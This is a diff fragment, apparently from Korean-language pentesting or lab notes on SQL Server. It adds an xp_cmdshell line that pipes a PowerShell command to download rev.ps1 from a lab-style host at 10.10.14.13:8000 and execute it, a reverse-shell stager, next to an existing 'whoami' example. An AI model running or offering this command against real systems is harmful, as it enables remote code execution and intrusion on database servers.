@@ -269,6 +269,8 @@ GO
 -- SQL Server 서비스 계정의 권한으로 OS 명령 실행
 EXECUTE xp_cmdshell 'whoami'
 GO
+
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
 ```
 ---
 
